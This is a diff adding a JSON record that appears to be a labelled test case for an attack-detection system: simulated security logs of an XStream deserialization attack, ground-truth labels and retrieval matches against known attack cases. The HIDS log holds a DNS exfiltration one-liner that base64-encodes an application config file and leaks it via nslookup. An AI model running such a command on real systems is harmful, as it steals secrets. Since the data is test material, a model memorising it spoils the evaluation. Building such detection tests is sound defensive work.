@@ -1,0 +1,195 @@
+{
+ "unit": 1040,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Java XStream 反序列化 dynamic-proxy 组件加载 + DNS 信标",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "dns",
+  "dns",
+  "dns"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-14 10:30:41",
+   "source": "waf",
+   "log_id": "WAF0293029",
+   "content": "/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS",
+   "event_id": "1040-WAF0293029"
+  },
+  {
+   "timestamp": "2026-06-14 10:30:43",
+   "source": "web",
+   "log_id": "WEB0294936",
+   "content": "/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS",
+   "event_id": "1040-WEB0294936"
+  },
+  {
+   "timestamp": "2026-06-14 10:30:44",
+   "source": "rasp",
+   "log_id": "RASP0324201",
+   "content": "https://app-java-143.ops-corp.com/api/v1/import {\"xstream\": \"dynamic-proxy\"} Mozilla/5.0 (Macintosh; Intel Mac",
+   "event_id": "1040-RASP0324201"
+  },
+  {
+   "timestamp": "2026-06-14 10:31:41",
+   "source": "hids",
+   "log_id": "HID0317560",
+   "content": "for l in $(cat /opt/app/config/application.yml|base64|fold -w30); do nslookup $l.pfdrmt-e598.io; done for for ",
+   "event_id": "1040-HID0317560"
+  },
+  {
+   "timestamp": "2026-06-17 11:07:41",
+   "source": "dns",
+   "log_id": "DNS0324249",
+   "content": "4b6843de.pfdrmt-e598.io A 10.10.41.133",
+   "event_id": "1040-DNS0324249"
+  },
+  {
+   "timestamp": "2026-06-17 11:08:06",
+   "source": "dns",
+   "log_id": "DNS0324251",
+   "content": "f69b72c1.pfdrmt-e598.io A 10.10.35.105",
+   "event_id": "1040-DNS0324251"
+  },
+  {
+   "timestamp": "2026-06-17 11:09:08",
+   "source": "dns",
+   "log_id": "DNS0324256",
+   "content": "1a1af427.pfdrmt-e598.io A 192.0.2.29",
+   "event_id": "1040-DNS0324256"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-002",
+   "name": "Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "summary": "PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
+   "matched_steps": 1,
+   "total_steps": 4,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "label": "DGA 风格子域突发解析",
+     "event_ids": [
+      "1040-DNS0324256"
+     ],
+     "sources": [
+      "dns"
+     ],
+     "generic": true
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 0,
+   "keyword_details": [],
+   "mitre": [
+    "T1190",
+    "T1505.003",
+    "T1071.004"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  },
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 0,
+   "total_steps": 3,
+   "shape": "none",
+   "longest_run": 0,
+   "tier": "keyword_only",
+   "order_ok": false,
+   "order_assessable": false,
+   "source_fit_ratio": 0.0,
+   "evidence": [],
+   "source_mismatches": [],
+   "keyword_score": 3,
+   "keyword_details": [
+    "keyword +3: base64"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 4,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S4",
+    "label": "DGA 风格子域突发解析",
+    "sources": [
+     "dns"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1040-DNS0324256"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 0,
+  "mitre": [
+   "T1190",
+   "T1505.003",
+   "T1071.004"
+  ]
+ }
+}
